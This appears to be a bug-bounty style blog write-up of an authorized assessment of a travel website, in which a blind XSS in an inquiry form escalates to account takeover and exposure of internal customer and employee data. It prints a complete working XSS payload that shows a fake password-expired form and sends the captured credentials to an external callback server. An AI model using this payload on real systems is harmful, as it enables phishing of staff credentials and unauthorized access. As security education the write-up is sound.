# It Started With Blind XSS: How a Travel Website Fell to Account Takeover

> **Author**: OxDevCypher
> **Published**: Dec 22, 2025

---

![OxDevCypher](https://miro.medium.com/v2/da:true/resize:fill:32:32/1*bMsMloenvZRC86u9y204vQ.gif)

24

Listen

Share

![image](https://miro.medium.com/v2/resize:fit:700/1*W2LEW1HGyatLSP41ef7-Xw.jpeg)

Hi, I’m Khushahal Sharma, a cybersecurity professional focused on web and API security, with hands-on experience in vulnerability assessment, penetration testing, and responsible disclosure.

I work on real-world applications — testing how small issues like misconfigurations or low-impact vulnerabilities can be chained into serious security risks. My approach is practical: understand the attacker’s mindset, validate impact responsibly, and translate findings into lessons that actually help teams improve their security.

In this post, I’ll walk through a legally authorized security assessment of a tour and travel website where a seemingly harmless Blind XSS became the entry point for a full account takeover. I’ll break down the methodology, the exploitation chain, and the key takeaways — focusing on why it worked, not just how.

## Reconnaissance and Initial Discovery

Like most real-world security assessments, this engagement didn’t begin with tools or payloads — it started with simple browsing. The target was a tour and travel website offering group tours, domestic travel, and international travel packages. On the surface, everything looked standard: marketing pages, travel listings, inquiry forms, and booking-related information.

While manually exploring the site, I focused on understanding the business flow rather than rushing into automated scans. One thing stood out quickly — there was no visible login page for customers or internal users. This shifted my attention toward identifying input points where user-controlled data was accepted and processed.

I mapped multiple areas such as search fields, filters, newsletters, and contact forms. The Contact Us / Inquiry Form proved the most interesting, as it collected detailed information including name, email, travel dates, destinations, and inquiry descriptions. Since these submissions were clearly reviewed by internal staff, the form became a strong candidate for testing Blind XSS.

## Blind XSS Confirmation and Escalation

I injected a simple, non-intrusive Blind XSS payload into the inquiry form and submitted it. There was no immediate reflection or alert, which was expected. The confirmation came the following day when I received a callback on my interaction server, triggered when a support team member opened the inquiry in their internal system. This confirmed the presence of a Blind XSS vulnerability.

![image](https://miro.medium.com/v2/resize:fit:700/1*w9vf4LB_xErLLvRBgyyA4g.png)

I attempted to escalate by testing payloads aimed at stealing authentication tokens, accessing session storage, and reading cookies. These attempts failed, likely due to reasonable controls such as HttpOnly cookies, secure flags, and Content Security Policy (CSP). At this point, I changed strategy.

Instead of token theft, I pivoted to user impersonation via phishing, delivered entirely through the Blind XSS vector. I crafted a payload that displayed a fake session-expiration message, prompting the user to re-login. The fake form requested a username, password, and an internal extension token. When submitted, the credentials were silently sent to my interaction server.

## Get OxDevCypher’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

This approach worked. Over time, I captured few valid credential sets, which was sufficient for proof of concept without unnecessary exposure.

```
"><img src=x onerror="alert('Your password has expired. Please re-authenticate.');document.body.innerHTML='<h2>Password Expired</h2><p>Please re-enter your credentials to continue.</p><label>Username</label><br><input id=u placeholder=Username><br><br><label>Password</label><br><input id=p type=password placeholder=Password><br><br><label>Extension No</label><br><input id=e placeholder=Extension><br><br><button onclick=send()>Continue</button>';window.send=function(){new Image().src='https://d54e6sknbbew8823jbf93ukxkk4k5opcs.oast.site/?creds='+encodeURIComponent(u.value+':'+p.value+':'+e.value);document.body.innerHTML='<p>Verifying… please wait.</p>';};">
```

![image](https://miro.medium.com/v2/resize:fit:700/1*Jq_whGajRCWgWHvuGiYY8A.png)

## Account Takeover and Impact Assessment

Using one of the captured credentials, I logged into the application successfully. At this stage, the issue had escalated from Blind XSS to full account takeover. Instead of stopping immediately, I continued with controlled post-exploitation to understand the real business impact, following a red-team assessment mindset while staying within responsible boundaries.

Once authenticated, the internal dashboard exposed extensive sensitive information, including employee and customer PII, HR-related data, inquiry records, call logs, booking details, visa application information, and complete flight schedules. The level of access effectively provided full operational visibility.

![image](https://miro.medium.com/v2/resize:fit:700/1*MQ1h80PKMbcs7CD4sVgaqQ.png)

Further analysis revealed that several backend APIs were improperly authenticated. Some endpoints could be accessed without tokens or with minimal validation, returning highly sensitive data in raw JSON format — ranging from customer onboarding and booking details to internal operational records.

![image](https://miro.medium.com/v2/resize:fit:700/1*VE2XbCiJz3zmNRHCBrC-ew.png)

## Final Note

This case shows how a seemingly issue like Blind XSS can escalate into serious risk when combined with real-world workflows and weak internal boundaries. Small oversights, when chained together, can have a much larger impact than expected.

All testing was conducted responsibly, and the goal of this write-up is to share practical lessons — not exploit details — so others can avoid …

Beyond fixing vulnerabilities, security training and awareness are equally essential for any business — especially for teams handling internal tools and sensitive data.

Happy bug hunting — peace out. ✌️



---
*Original URL: [https://medium.com/@khushal007/it-started-with-blind-xss-how-a-travel-website-fell-to-account-takeover-0c94c16c7732?source=search_post---------104-----------------------------------](https://medium.com/@khushal007/it-started-with-blind-xss-how-a-travel-website-fell-to-account-takeover-0c94c16c7732?source=search_post---------104-----------------------------------)*
